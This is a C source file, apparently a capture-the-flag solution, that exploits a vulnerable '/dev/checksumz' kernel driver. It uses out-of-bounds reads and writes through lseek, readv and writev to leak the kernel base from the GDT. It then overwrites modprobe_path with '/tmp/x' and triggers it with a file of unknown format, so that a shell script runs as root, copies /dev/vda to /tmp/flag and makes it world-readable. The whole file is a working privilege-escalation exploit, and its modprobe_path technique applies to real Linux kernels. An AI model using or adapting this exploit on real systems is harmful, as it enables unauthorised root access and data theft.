
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>

void hexdump(void *buf, size_t len) {
    unsigned char *data = (unsigned char *)buf;
    for (size_t i = 0; i < len; i++) {
        // 16진수 출력
        printf("%02x ", data[i]);
        
        // 한 줄에 16개씩 출력
        if ((i + 1) % 16 == 0 || i + 1 == len) {
            // ASCII 출력
            printf(" | ");
            for (size_t j = i - (i % 16); j <= i; j++) {
                if (data[j] >= 32 && data[j] <= 126)  // ASCII 범위에 해당하는 문자만 출력
                    printf("%c", data[j]);
                else
                    printf(".");
            }
            printf("\n");
        }
    }
}

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

int main() {
    int fd = open("/dev/checksumz", O_RDWR);
    char buf[0x200];
    int64_t gdt = 0xfffffe000000000c;

    lseek(fd, 511, 0);

    struct iovec iov[1];

    iov[0].iov_base = buf;  // First buffer
    iov[0].iov_len = 0x1000;

    readv(fd, iov, 1);

    hexdump(buf, 0x50);
    
    uint64_t buffer = *(uint64_t *)((char *)(buf + 0x11)) + 8;

    printf("buffer : 0x%lx\n", buffer);
    fflush(stdout);

    iov[0].iov_base = buf;  // First buffer
    iov[0].iov_len = 0x8;
    
    *(uint64_t *)buf = 0xffffffffffffff00;
    writev(fd, iov, 1);

    iov[0].iov_len = 0x10;
    uint64_t kbase = 0;
    for(int i = 0; i < 0x100; i++){
        lseek(fd, gdt-buffer+(0x1000*i), 0);
        read(fd, buf, 0x10);
        if(*(uint64_t *)((char *)(buf + 0x8)) > 0xFFFFFFFF81000000){
            buffer -= (0x1000*i);
            kbase = *(uint64_t *)((char *)(buf + 0x8)) - 0x1008e00;
            break;
        }
    }

    if(!kbase){
        exit(0);
    }

    uint64_t modprob = kbase + 0x1B3F100;

    printf("buffer : 0x%lx\n", buffer);
    printf("kbase : 0x%lx\n", kbase);
    printf("modeprob : 0x%lx\n", modprob);


    iov[0].iov_len = 0x8;

    for(int i = 0; i < 0x10; i++){
        lseek(fd, modprob-buffer-(0x100*i), 0);
        readv(fd, iov, 1);
        if(*(uint64_t *)buf == 0x6f6d2f6e6962732f){
            lseek(fd, modprob-buffer-(0x100*i), 0);
            *(uint64_t *)buf = 0x782f706d742f;
            writev(fd, iov, 1);
        }
    }

    get_flag();
    close(fd);
    return 0;
}